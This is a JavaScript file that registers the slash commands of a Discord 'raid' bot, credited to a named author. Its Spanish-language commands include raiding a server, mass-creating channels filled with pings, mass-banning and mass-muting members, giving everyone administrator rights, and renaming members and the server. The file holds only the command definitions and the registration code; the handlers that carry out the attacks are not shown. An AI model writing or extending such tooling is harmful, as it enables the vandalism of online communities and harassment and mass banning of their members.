/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/

const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { SlashCommandBuilder } = require("@discordjs/builders")
const commands = [
 new SlashCommandBuilder()
  .setName('raid')
  .setDescription('Raidea un servidor')
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('customraid')
  .setDescription('Customiza tu raideo')
  .addNumberOption(option => option.setName('c-canales').setDescription('Coloca una cantidad de canales (Max: 300)').setRequired(true))
  .addStringOption(option => option.setName('channels-name').setDescription('Establece el nombre de los canales nuevos!').setRequired(true))
  .addStringOption(option => option.setName('text-send').setDescription('Coloca el texto que enviará a los canales afectados!').setRequired(true))
  .addNumberOption(option => option.setName('c-pings').setDescription('Selecciona una cantidad de menciones por canal. (Max: 30)').setRequired(true))
  .addBooleanOption(option => option.setName('massban').setDescription('MassBan? (True(Si) / False(No))').setRequired(true))
  .addStringOption(option => option.setName('apodos').setDescription('Establece los apodos de los miembros!'))
  .addStringOption(option => option.setName('server-icon').setDescription('Establece el icono del servidor (https://cool-img/123.png/gif/etc)'))
  .addStringOption(option => option.setName('server-nombre').setDescription('Establece el nombre del server'))
  .addStringOption(option => option.setName('server-banner').setDescription('Establece el banner del server (https://cool-img/123.png/gif/etc)'))
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('limpiar')
  .setDescription('Limpia los canales del servidor')
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('massban')
  .setDescription('Banea a usuarios inferiores a mi rol en el servidor.')
  ,//////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('massmute')
  .setDescription('Mutea a usuarios inferiores a mi rol en el servidor.')
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName("massroles")
  .setDescription("Crea muchos roles en el servidor")
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('admin')
  .setDescription('Date Admin en el servidor o a alguien más.')
  .addUserOption(data => data.setName('miembro').setDescription('Dale admin al usuario que quieras. (Opcional)'))
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('adminall')
  .setDescription('Dale Administrador a todos en el servidor.')
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('massnames')
  .setDescription('Cambia el apodo de usuarios inferiores a mi rol en el servidor.')
  .addStringOption(option => option.setName('apodo').setDescription('Escribe el apodo').setRequired(true))
  ,////////////////////////////////////////////
  new SlashCommandBuilder()
  .setName('salir')
  .setDescription('Saca al bot del servidor')
  ,
]; 

const rest = new REST({ version: '9' }).setToken(require('./config.json').botTOKEN);

(async () => {
  try {
    console.log('Cargando Slashcmds...');

    await rest.put(
        Routes.applicationCommands(require('./config.json').botID),{
            body: commands
        }
        
    )

    console.log('Slashcmds cargados correctamente...');
  } catch (error) {
    console.error(error);
  }
})();